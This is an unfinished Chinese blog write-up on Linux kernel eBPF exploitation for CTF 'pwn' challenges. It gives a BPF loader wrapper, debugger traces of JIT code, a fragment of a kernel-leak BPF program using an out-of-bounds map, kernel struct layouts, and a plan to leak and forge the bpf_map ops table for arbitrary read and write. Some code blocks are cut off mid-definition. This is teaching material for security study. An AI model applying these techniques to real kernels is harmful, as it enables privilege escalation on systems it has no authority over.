+++
title = '内核ebpfpwn（未完成版）'
date = 2026-02-02T12:14:05+08:00
draft = false
categories = ["pwn"]
hiddenFromHomePage=false
summary = ""

+++



<!--more-->





## 基础知识



### 常用代码

```c
//gcc ./bpf.c -o bpf
#include <stdio.h>
#include <stdlib.h>  //为了exit()函数
#include <stdint.h>    //为了uint64_t等标准类型的定义
#include <errno.h>    //为了错误处理
#include <unistd.h>
#include <linux/bpf.h>    //位于/usr/include/linux/bpf.h, 包含BPF系统调用的一些常量, 以及一些结构体的定义
#include <sys/syscall.h>    //为了syscall()

//类型转换, 减少warning, 也可以不要
#define ptr_to_u64(x) ((uint64_t)x)

//对于系统调用的包装, __NR_bpf就是bpf对应的系统调用号, 一切BPF相关操作都通过这个系统调用与内核交互
int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

//用于保存BPF验证器的输出日志
#define LOG_BUF_SIZE 0x1000
char bpf_log_buf[LOG_BUF_SIZE];

//通过系统调用, 向内核加载一段BPF指令
int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn* insns, int insn_cnt, const char* license)
{
    union bpf_attr attr = {
        .prog_type = type,        //程序类型
        .insns = ptr_to_u64(insns),    //指向指令数组的指针
        .insn_cnt = insn_cnt,    //有多少条指令
        .license = ptr_to_u64(license),    //指向整数字符串的指针
        .log_buf = ptr_to_u64(bpf_log_buf),    //log输出缓冲区
        .log_size = LOG_BUF_SIZE,    //log缓冲区大小
        .log_level = 2,    //log等级
    };

    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

//BPF程序就是一个bpf_insn数组, 一个struct bpf_insn代表一条bpf指令
struct bpf_insn bpf_prog[] = {

当程序停在 `0xffffffffb3da8d3a` 时，这个指令就是`call rax`。此时 `RAX` 寄存器里存的就是 eBPF 程序 JIT 编译后的入口地址。

```
pwndbg> p/x $rip
$8 = 0xffffffffb3da8d3a
pwndbg> i r rax
rax            0xffffffffc022566c  -1071491476
pwndbg> vmmap 0xffffffffc022566c
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
  0xffffffffb49a3000 0xffffffffb4e00000 rw-p   45d000  462000 kernel [.bss]
► 0xffffffffc0225000 0xffffffffc0425000 r-xp   200000       0 kernel [.driver .bpf] +0x66c
pwndbg>
```

按`s`步入之后，就是在执行`bpf`程序了



我这里的程序能对应上：

```asm
pwndbg> p/x $rip
$9 = 0xffffffffc022566c
pwndbg> x/30i 0xffffffffc022566c
=> 0xffffffffc022566c:  endbr64
   0xffffffffc0225670:  nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffffc0225675:  nop    DWORD PTR [rax]
   0xffffffffc0225678:  push   rbp
   0xffffffffc0225679:  mov    rbp,rsp
   0xffffffffc022567c:  endbr64
   0xffffffffc0225680:  sub    rsp,0x8
   0xffffffffc0225687:  push   rbx
   0xffffffffc0225688:  push   r13
   0xffffffffc022568a:  push   r14
   0xffffffffc022568c:  push   r15
   0xffffffffc022568e:  xor    eax,eax		#BPF_MOV64_IMM(BPF_REG_0, 0),
   0xffffffffc0225690:  mov    edi,0x63626160 	#BPF_MOV64_IMM(BPF_REG_1, test),
   0xffffffffc0225695:  mov    DWORD PTR [rbp-0x4],eax #BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
   0xffffffffc0225698:  lfence
   0xffffffffc022569b:  mov    rbx,rdi		#BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
   0xffffffffc022569e:  movabs rdi,0xffffa2eb81e43000 #BPF_LD_MAP_FD(BPF_REG_1, oob_map),
   0xffffffffc02256a8:  mov    rsi,rbp		#BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
   0xffffffffc02256ab:  add    rsi,0xfffffffffffffffc  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
   0xffffffffc02256af:  add    rdi,0xf8
   0xffffffffc02256b6:  mov    eax,DWORD PTR [rsi+0x0]
   0xffffffffc02256b9:  cmp    rax,0x1
   0xffffffffc02256bd:  jae    0xffffffffc02256ce
   0xffffffffc02256bf:  and    eax,0x0
   0xffffffffc02256c2:  imul   rax,rax,0x150
   0xffffffffc02256c9:  add    rax,rdi
   0xffffffffc02256cc:  jmp    0xffffffffc02256d0
   0xffffffffc02256ce:  xor    eax,eax
   0xffffffffc02256d0:  test   rax,rax
   0xffffffffc02256d3:  jne    0xffffffffc02256de
```

```c
    size_t test = 0;
    memcpy(&test, "\x60\x61\x62\x63\x64\x65\x66\x67", 8);

    struct bpf_insn kleak_prog[] = {
        // load map_ptr_or_null in BPF_REG_0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_MOV64_IMM(BPF_REG_1, test),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map)
```









#### pwndbg

`pwndbg`有一个命令`kbpf`，但是题目编译的内核一般用不了这个命令，少了点东西。。。







### pwn思路

当我们用`bpf`系统调用创建了一个类型为`BPF_MAP_TYPE_ARRAY`的`map`的时候，会创建一个结构体：

```c
struct bpf_array {
        struct bpf_map             map;                  /*     0   240 */
        /* --- cacheline 3 boundary (192 bytes) was 48 bytes ago --- */
        u32                        elem_size;            /*   240     4 */
        u32                        index_mask;           /*   244     4 */
        struct bpf_array_aux *     aux;                  /*   248     8 */
        /* --- cacheline 4 boundary (256 bytes) --- */
        union {
                struct {
                        struct {
                        } __empty_value;                 /*   256     0 */
                        char       value[0];             /*   256     0 */
                };                                       /*   256     0 */
                struct {
                        struct {
                        } __empty_ptrs;                  /*   256     0 */
                        void *     ptrs[0];              /*   256     0 */
                };                                       /*   256     0 */
                struct {
                        struct {
                        } __empty_pptrs;                 /*   256     0 */
                        void *     pptrs[0];             /*   256     0 */
                };                                       /*   256     0 */
        };                                               /*   256     0 */

        /* size: 256, cachelines: 4, members: 5 */
};
```

其中最重要的就是第一个成员：

```c
struct bpf_map {
        const struct bpf_map_ops  * ops;                 /*     0     8 */
        struct bpf_map *           inner_map_meta;       /*     8     8 */
        void *                     security;             /*    16     8 */
        enum bpf_map_type          map_type;             /*    24     4 */
        u32                        key_size;             /*    28     4 */
        u32                        value_size;           /*    32     4 */
        u32                        max_entries;          /*    36     4 */
        u64                        map_extra;            /*    40     8 */
        u32                        map_flags;            /*    48     4 */
        u32                        id;                   /*    52     4 */
        struct btf_record *        record;               /*    56     8 */
        /* --- cacheline 1 boundary (64 bytes) --- */
        int                        numa_node;            /*    64     4 */
        u32                        btf_key_type_id;      /*    68     4 */
        u32                        btf_value_type_id;    /*    72     4 */
        u32                        btf_vmlinux_value_type_id; /*    76     4 */
        struct btf *               btf;                  /*    80     8 */
        char                       name[16];             /*    88    16 */
        struct mutex               freeze_mutex;         /*   104    32 */
        /* --- cacheline 2 boundary (128 bytes) was 8 bytes ago --- */
        atomic64_t                 refcnt;               /*   136     8 */
        atomic64_t                 usercnt;              /*   144     8 */
        union {
                struct work_struct work;                 /*   152    32 */
                struct callback_head rcu;                /*   152    16 */
        };                                               /*   152    32 */
        atomic64_t                 writecnt;             /*   184     8 */
        /* --- cacheline 3 boundary (192 bytes) --- */
        struct {
                const struct btf_type  * attach_func_proto; /*   192     8 */
                spinlock_t         lock;                 /*   200     4 */
                enum bpf_prog_type type;                 /*   204     4 */
                bool               jited;                /*   208     1 */
                bool               xdp_has_frags;        /*   209     1 */
        } owner;                                         /*   192    24 */

        /* XXX last struct has 6 bytes of padding */

        bool                       bypass_spec_v1;       /*   216     1 */
        bool                       frozen;               /*   217     1 */
        bool                       free_after_mult_rcu_gp; /*   218     1 */
        bool                       free_after_rcu_gp;    /*   219     1 */

        /* XXX 4 bytes hole, try to pack */

        atomic64_t                 sleepable_refcnt;     /*   224     8 */
        s64 *                      elem_count;           /*   232     8 */

        /* size: 240, cachelines: 4, members: 29 */
        /* sum members: 236, holes: 1, sum holes: 4 */
        /* paddings: 1, sum paddings: 6 */
        /* last cacheline: 48 bytes */
};
```

`bpf_map_ops`中存的是一系列虚表函数。通常，我们需要通过越界读写等手段，修改这个虚表

```c
// include/linux/bpf.h
/* map is generic key/value storage optionally accessible by eBPF programs */
struct bpf_map_ops {
	// ...

	/* funcs callable from userspace and from eBPF programs */
	void *(*map_lookup_elem)(struct bpf_map *map, void *key);
	long (*map_update_elem)(struct bpf_map *map, void *key, void *value, u64 flags);
	long (*map_delete_elem)(struct bpf_map *map, void *key);
	long (*map_push_elem)(struct bpf_map *map, void *value, u64 flags);
	long (*map_pop_elem)(struct bpf_map *map, void *value);
    
	// ...
};
```



- 泄露地址：把`ops`写回`bpf_array`中的`values`域中，读出来即可
- 任意地址读写：在`values`中伪造一个`ops`，劫持`ops`指针指向这个伪造的`ops`，这样调用某个虚表函数其实是调用我们想要调用的函数











`helper function`是内核定义的函数，能被`ebpf`程序调用

